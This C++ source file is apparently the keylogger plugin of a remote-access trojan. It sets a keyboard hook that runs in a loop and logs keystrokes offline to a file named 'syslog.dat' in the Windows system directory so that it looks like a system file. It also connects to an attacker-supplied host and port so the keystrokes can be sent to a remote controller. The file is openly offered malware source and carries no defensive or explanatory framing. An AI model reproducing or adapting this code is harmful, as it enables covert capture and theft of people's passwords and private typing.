#include "stdafx.h"
#include "ClientSocket.h"
#include "MyKeyboardManager.h"
#include "until.h"

extern bool g_bSignalHook;

HINSTANCE hHinstance;

DWORD WINAPI Loop_HookKeyboard(LPARAM lparam)
{
	TCHAR strKeyboardOfflineRecord[MAX_PATH];
	GetSystemDirectory(strKeyboardOfflineRecord, sizeof(strKeyboardOfflineRecord));
	lstrcat(strKeyboardOfflineRecord, _T("\\syslog.dat"));

	if (GetFileAttributes(strKeyboardOfflineRecord) != -1)
		g_bSignalHook = true;
	else
		g_bSignalHook = false;

	while (1)
	{
		while (g_bSignalHook == false) Sleep(100);
		CMyKeyboardManager::StartHook();
		while (g_bSignalHook == true) Sleep(100);
		CMyKeyboardManager::StopHook();
	}

	return 0;
}

extern "C" __declspec(dllexport) BOOL PluginMe(LPCSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
{
	CMyKeyboardManager::g_hInstance = hHinstance;
	CMyKeyboardManager::m_dwLastMsgTime = GetTickCount();
	CMyKeyboardManager::Initialization();

	MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_HookKeyboard, NULL, 0, NULL, true);

	CClientSocket socketClient;
	if (!socketClient.Connect(lpszHost, nPort))
		return -1;

	CMyKeyboardManager	manager(&socketClient);

	socketClient.run_event_loop();

	return 0;
}

BOOL APIENTRY mymain(HANDLE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	hHinstance = (HINSTANCE)hModule;
	return TRUE;
}